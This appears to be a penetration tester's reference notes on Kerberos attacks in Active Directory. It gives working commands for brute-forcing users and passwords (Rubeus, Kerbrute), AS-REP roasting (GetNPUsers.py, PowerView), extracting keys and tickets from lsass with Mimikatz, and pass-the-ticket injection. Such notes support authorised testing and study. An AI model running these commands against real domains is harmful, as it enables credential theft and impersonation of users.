# Brute Force
We can brute force username and password based on the errors that we get from kerberos.
- `KDC_ERR_PREAUTH_FAILED`: Incorrect password
- `KDC_ERR_C_PRINCIPAL_UNKNOWN`: Invalid username
- `KDC_ERR_WRONG_REALM`: Invalid domain
- `KDC_ERR_CLIENT_REVOKED`: Disabled/Blocked user
### Rubeus
```powershell
./rubeus.exe brute /password:<password> /noticket
```
### Kerbrute (go)
1. User Enumeration
```bash
./kerbrute userenum -d mydomain.local usernames.txt
```
2. Password brute-force
```bash
cat user_password.txt | ./kerbrute -d mydomain.local bruteforce -
```
### Kerbrute.py
```bash
python kerbrute.py -domain mydomain.local -users user.txt -passwords pass.txt -dc-ip <ip>
```
# AS-REPRoast/Targeted Kerberoasting
- In kerberos, pre-authentication is required for users. 
- Pre-Authentication is when a user sends the timestamp encrypted with it's kerberos key to request TGT (AS-REQ)
- In some cases, some users may have the `DONT_REQUIRE_PREAUTH` flag set. These users don't need to encrypt their timestamp with their kerberos key, hence anyone can create AS-REQ as that user and receive AS-REP encrypted with these users's key.
- AS-REProast involves impersonating these users and receiving the AS-REP. The AS-REP can be cracked offline to recover the password of the user.
- LDAP filter to query users without pre-authentication.
```ldap
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```
- Impacket's GetNPUsers.py script can be used to get the users without pre-authentication and get their AS-REP data.
```bash
GetNPUsers.py 'mydomain.local\drdragon:Password!!' --dc-ip -outputfile asrep-hashes.txt
```
- Powerview
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
- Active Directory Module
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

# Pass the Key/Overpass the Hash
- To request a TGT, the user needs to send a timestamp encrypted with it's key.
- If we have a user's key, it can be used to request a TGT of the user.
- Kerberos keys are cached in `lsass` process. Can be extracted using [[Active Directory/Credential Dumping/Mimikatz|Mimikatz]]
```bash
sekurlsa::ekeys
```

# Pass the Ticket
- Pass the ticket involves stealing the ticket and the session key and using it impersonate the user to get access to resources or services.
- TGT & ST can be used, but TGTs are preferred because we get access to any service.
### Mimikatz
```bash
# Tickets can be extracted from lsass memory using the following command
sekurlsa::tickets /export
# On linux, it the keys are located in files. Location of these files can be found in the kerberos configuration files: `/etc/krb5.conf`.

# Use the tickets
kerberos::ptt my-tgt.kirbi
# This purges the current tickets from memory and injects the specified tickets

# verify the ticket 
klist
```
### Rubeus
```bash
.\Rubeus.exe dump # Dumps the tickets 
# Dumps all ticket when run with elevated privilege
.\Rubeus.exe /nowrap # dumps ticket with no new lines
.\Rubeus.exe /service:krbtgt # specify service

# Using the ticket
.\Rubeus.exe ptt /ticket:<base64ticket> 

# Verify the ticket
klist
```
